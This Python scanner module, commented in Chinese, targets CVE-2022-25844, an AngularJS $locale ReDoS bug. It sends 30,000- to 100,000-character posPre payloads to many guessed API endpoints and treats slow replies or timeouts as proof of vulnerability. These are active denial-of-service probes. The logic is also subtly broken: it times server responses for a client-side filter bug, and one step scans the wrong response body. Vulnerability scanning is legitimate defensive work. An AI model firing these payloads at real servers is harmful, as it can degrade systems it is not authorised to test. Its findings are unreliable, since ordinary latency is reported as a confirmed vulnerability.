"""
CVE-2022-25844 Vulnerability Detection Script
AngularJS $locale NUMBER_FORMATS ReDoS - CVSS 7.5 (High)
影響版本: AngularJS >= 1.7.0
"""

import requests
import time
import re
from urllib.parse import urljoin

def scan(session, target_url):
    """
    掃描 CVE-2022-25844 弱點
    AngularJS $locale.NUMBER_FORMATS.PATTERNS[1].posPre ReDoS 攻擊
    真實攻擊向量：通過覆寫 posPre 為超長字串，在 currency 過濾器中觸發正規表達式災難性回溯
    """
    result = {
        'vulnerable': False,
        'evidence': '',
        'description': 'CVE-2022-25844: AngularJS $locale NUMBER_FORMATS ReDoS 弱點，通過覆寫 posPre 為超長字串在 currency 過濾器中觸發災難性回溯',
        'remediation': '更新到 AngularJS NES 1.8.8+，避免允許使用者控制 $locale 設定，實施數字格式化輸入驗證'
    }
    
    try:
        print("      [檢測] 正在檢查 CVE-2022-25844 $locale ReDoS 弱點...")
        
        # Step 1: 檢測 AngularJS 使用和版本
        response = session.get(target_url, timeout=30)
        
        angular_indicators = [
            'angular.js',
            'angular.min.js',
            'ng-app',
            'ng-controller',
            'angular.module'
        ]
        
        locale_indicators = [
            '$locale',
            'NUMBER_FORMATS',
            'PATTERNS',
            'currency',
            'filter',
            'localization',
            'i18n'
        ]
        
        uses_angular = any(indicator in response.text.lower() for indicator in angular_indicators)
        uses_locale = any(indicator in response.text for indicator in locale_indicators)
        
        if not uses_angular:
            result['evidence'] = "未檢測到 AngularJS 應用程式"
            return result
        
        print(f"      [檢測] 發現 AngularJS 應用程式，locale 功能檢測: {'是' if uses_locale else '否'}")
        
        # Step 2: 檢查 AngularJS 版本是否受影響
        version_patterns = [
            r'angular\.version\s*=\s*["\']([0-9.]+)',
            r'angular[.-]([0-9.]+)\.(?:min\.)?js',
            r'AngularJS\s+v?([0-9.]+)'
        ]
        
        detected_version = None
        vulnerable_version = False
        
        for pattern in version_patterns:
            match = re.search(pattern, response.text)
            if match:
                detected_version = match.group(1)
                print(f"      [檢測] 檢測到 AngularJS 版本: {detected_version}")
                
                # 檢查版本是否受影響 (>= 1.7.0)
                version_parts = detected_version.split('.')
                if len(version_parts) >= 2:
                    major = int(version_parts[0])
                    minor = int(version_parts[1])
                    if major > 1 or (major == 1 and minor >= 7):
                        vulnerable_version = True
                        print(f"      [檢測] 版本 {detected_version} 受 CVE-2022-25844 影響")
                break
        
        # Step 3: 構造 locale ReDoS 攻擊負載
        # 基於 HeroDevs PoC：覆寫 $locale.NUMBER_FORMATS.PATTERNS[1].posPre
        locale_redos_payloads = [
            {
                'posPre_length': 50000,
                'test_value': -100,
                'description': '50K spaces posPre ReDoS',
                'expected_delay': 2.0
            },
            {
                'posPre_length': 100000,
                'test_value': -1000,
                'description': '100K spaces massive ReDoS',
                'expected_delay': 5.0
            },
            {
                'posPre_length': 80000,
                'test_value': -50,
                'description': '80K spaces medium ReDoS',
                'expected_delay': 3.0
            }
        ]
        
        # Step 4: 測試 locale 設定和數字格式化端點
        locale_endpoints = [
            '/api/locale',
            '/api/i18n',
            '/api/localization',
            '/api/format',
            '/api/currency',
            '/api/number',
            '/locale',
            '/i18n',
            '/format',
            '/currency'
        ]
        
        general_endpoints = [
            '/api/config',
            '/api/settings',
            '/api/user',
            '/config',
            '/settings'
        ]
        
        all_endpoints = locale_endpoints + general_endpoints
        
        print(f"      [檢測] 開始測試 {len(locale_redos_payloads)} 個 locale ReDoS 負載...")
        
        for endpoint in all_endpoints:
            try:
                # 檢查端點可用性
                test_response = session.get(urljoin(target_url, endpoint), timeout=10)
                if test_response.status_code == 404:
                    continue
                
                print(f"      [檢測] 測試端點: {endpoint}")
                
                for payload_data in locale_redos_payloads:
                    posPre_length = payload_data['posPre_length']
                    test_value = payload_data['test_value']
                    description = payload_data['description']
                    expected_delay = payload_data['expected_delay']
                    
                    try:
                        # 構造 locale 覆寫攻擊負載
                        malicious_posPre = ' ' * posPre_length
                        
                        locale_payload = {
                            'locale': {
                                'NUMBER_FORMATS': {
                                    'PATTERNS': [
                                        {},  # PATTERNS[0] - 正數格式
                                        {    # PATTERNS[1] - 負數格式 (攻擊目標)
                                            'posPre': malicious_posPre,
                                            'posPost': '',
                                            'negPre': '-',
                                            'negPost': ''
                                        }
                                    ]
                                }
                            },
                            'currency_symbol': '',
                            'test_number': test_value,
                            'format_number': test_value
                        }
                        
                        # 替代格式：直接設定 posPre
                        direct_payload = {
                            'posPre': malicious_posPre,
                            'NUMBER_FORMATS_PATTERNS_1_posPre': malicious_posPre,
                            'locale_posPre': malicious_posPre,
                            'currency_format': malicious_posPre,
                            'number': test_value,
                            'value': test_value
                        }
                        
                        print(f"      [檢測] 執行 {description} (posPre: {posPre_length} 字符)...")
                        
                        # 測試 JSON 格式的 locale 設定
                        start_time = time.time()
                        
                        headers = {'Content-Type': 'application/json'}
                        response = session.post(
                            urljoin(target_url, endpoint),
                            json=locale_payload,
                            headers=headers,
                            timeout=30
                        )
                        
                        end_time = time.time()
                        duration = end_time - start_time
                        
                        print(f"      [檢測] Locale 設定處理耗時: {duration:.2f} 秒")
                        
                        # 判斷是否存在 ReDoS
                        if duration > expected_delay:
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 CVE-2022-25844 $locale ReDoS 弱點！\n\n攻擊詳情:\n- 負載: {description}\n- posPre 長度: {posPre_length:,} 字符\n- 測試數值: {test_value} (負數觸發 PATTERNS[1])\n- 處理時間: {duration:.2f} 秒 (預期: {expected_delay:.1f}秒)\n\n這證明了 AngularJS currency 過濾器在處理超長 posPre 時發生災難性回溯，攻擊者可利用此弱點造成前端渲染延遲或拒絕服務。"
                            return result
                        
                        # 測試直接格式設定
                        start_time = time.time()
                        
                        response = session.post(
                            urljoin(target_url, endpoint),
                            json=direct_payload,
                            headers=headers,
                            timeout=30
                        )
                        
                        end_time = time.time()
                        duration = end_time - start_time
                        
                        if duration > expected_delay:
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 $locale ReDoS 弱點 (直接設定)。{description} 耗時 {duration:.2f} 秒。"
                            return result
                        
                        # 測試 Form-encoded 格式
                        form_data = {
                            'locale[NUMBER_FORMATS][PATTERNS][1][posPre]': malicious_posPre,
                            'posPre': malicious_posPre,
                            'number': str(test_value),
                            'currency': '',
                            'format': 'currency'
                        }
                        
                        start_time = time.time()
                        
                        response = session.post(
                            urljoin(target_url, endpoint),
                            data=form_data,
                            timeout=30
                        )
                        
                        end_time = time.time()
                        duration = end_time - start_time
                        
                        if duration > expected_delay:
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 $locale ReDoS 弱點 (表單格式)。{description} 耗時 {duration:.2f} 秒。"
                            return result
                            
                    except requests.exceptions.Timeout:
                        result['vulnerable'] = True
                        result['evidence'] = f"在端點 {endpoint} 發現嚴重的 CVE-2022-25844 $locale ReDoS 弱點！{description} 導致請求逾時 (>30秒)，證明 currency 過濾器正規表達式發生災難性回溯。posPre 長度: {posPre_length:,} 字符。"
                        return result
                    
                    except Exception as e:
                        if "timeout" in str(e).lower():
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 $locale ReDoS 弱點。{description} 導致連線逾時。"
                            return result
                        continue
                        
            except Exception as e:
                continue
        
        # Step 5: 測試特定的數字格式化場景
        print("      [檢測] 測試特定數字格式化場景...")
        
        currency_test_endpoints = [
            '/api/currency/format',
            '/api/format/currency',
            '/api/number/format',
            '/format/number',
            '/currency/convert'
        ]
        
        for endpoint in currency_test_endpoints:
            try:
                # 測試 currency 過濾器相關的 ReDoS
                medium_payload = ' ' * 30000  # 中等強度測試
                
                currency_data = {
                    'value': -100,
                    'currency': '',
                    'symbol': '',
                    'locale': 'custom',
                    'format': {
                        'posPre': medium_payload
                    }
                }
                
                start_time = time.time()
                
                response = session.post(
                    urljoin(target_url, endpoint),
                    json=currency_data,
                    timeout=20
                )
                
                end_time = time.time()
                duration = end_time - start_time
                
                if duration > 1.5:
                    result['vulnerable'] = True
                    result['evidence'] = f"在currency端點 {endpoint} 發現 $locale ReDoS 弱點。medium payload 耗時 {duration:.2f} 秒。"
                    return result
                    
            except requests.exceptions.Timeout:
                result['vulnerable'] = True
                result['evidence'] = f"currency 端點 {endpoint} ReDoS 測試導致逾時。"
                return result
            except:
                continue
        
        # Step 6: 分析現有的 locale 和 currency 使用
        print("      [檢測] 分析現有的 locale 和 currency 實作...")
        
        locale_usage_patterns = [
            r'\$locale\.NUMBER_FORMATS',
            r'PATTERNS\[1\]\.posPre',
            r'currency\s*\|',
            r'\|\s*currency',
            r'NUMBER_FORMATS\.PATTERNS',
            r'localization',
            r'i18n'
        ]
        
        found_locale_usage = []
        for pattern in locale_usage_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                found_locale_usage.extend(matches)
        
        if found_locale_usage:
            print(f"      [檢測] 發現 {len(found_locale_usage)} 個 locale/currency 相關用法")
            
            # 檢查是否有可控制的 locale 設定
            controllable_patterns = []
            dangerous_keywords = ['user', 'input', 'config', 'setting', 'custom']
            
            for usage in found_locale_usage:
                if any(keyword in usage.lower() for keyword in dangerous_keywords):
                    controllable_patterns.append(usage)
            
            if controllable_patterns and vulnerable_version:
                result['vulnerable'] = True
                result['evidence'] = f"發現可能受 CVE-2022-25844 影響的 locale 實作。AngularJS 版本 {detected_version} 結合 {len(controllable_patterns)} 個可控制的 locale 設定，存在 ReDoS 攻擊風險。"
                return result
        
        # Step 7: 執行輕量級 locale 測試
        print("      [檢測] 執行輕量級 locale 功能測試...")
        
        lightweight_tests = [
            {'posPre': ' ' * 1000, 'number': -50},
            {'posPre': ' ' * 2000, 'number': -100},
            {'locale_setting': 'custom', 'format': 'currency'}
        ]
        
        for test_data in lightweight_tests:
            for endpoint in ['/api/test', '/test', '/api/format']:
                try:
                    start_time = time.time()
                    
                    response = session.post(
                        urljoin(target_url, endpoint),
                        json=test_data,
                        timeout=8
                    )
                    
                    end_time = time.time()
                    duration = end_time - start_time
                    
                    if duration > 0.5:
                        print(f"      [檢測] 在 {endpoint} 檢測到 locale 處理延遲 ({duration:.2f}s)")
                        if vulnerable_version:
                            result['evidence'] += f" 輕量級測試顯示版本 {detected_version} 存在 locale 處理效能問題。"
                            
                except:
                    continue
        
        # Step 8: 檢查前端 AngularJS currency 過濾器使用
        currency_filter_patterns = [
            r'\{\{\s*[^}]*\|\s*currency[^}]*\}\}',
            r'\|\s*currency\s*:\s*["\']["\']',
            r'currency\s*filter',
            r'\$filter\s*\(\s*["\']currency["\']'
        ]
        
        found_currency_filters = []
        for pattern in currency_filter_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                found_currency_filters.extend(matches)
        
        if found_currency_filters:
            print(f"      [檢測] 發現 {len(found_currency_filters)} 個 currency 過濾器使用")
            
            # 檢查是否有空字串 currency symbol (觸發 ReDoS 的條件)
            empty_currency_patterns = []
            for filter_usage in found_currency_filters:
                if "''" in filter_usage or '""' in filter_usage:
                    empty_currency_patterns.append(filter_usage)
            
            if empty_currency_patterns and vulnerable_version:
                print(f"      [檢測] 發現 {len(empty_currency_patterns)} 個使用空字串的 currency 過濾器")
        
        # 最終結果評估
        if vulnerable_version and (found_locale_usage or found_currency_filters):
            result['evidence'] = f"檢測摘要: AngularJS 版本 {detected_version} 受 CVE-2022-25844 影響。發現 {len(found_locale_usage)} 個 locale 用法和 {len(found_currency_filters)} 個 currency 過濾器。雖未觸發明確的 ReDoS 攻擊，但建議檢查 $locale 設定的使用者控制性並更新版本。"
        elif vulnerable_version:
            result['evidence'] = f"檢測摘要: AngularJS 版本 {detected_version} 受 CVE-2022-25844 影響，但未發現明顯的 locale/currency 使用。建議預防性更新版本。"
        else:
            result['evidence'] = f"完成 CVE-2022-25844 檢測。測試了 {len(all_endpoints)} 個端點和 {len(locale_redos_payloads)} 個 ReDoS 負載，未發現明確的 $locale ReDoS 弱點。"
        
    except Exception as e:
        result['evidence'] = f"掃描過程中發生錯誤: {str(e)}"
    
    return result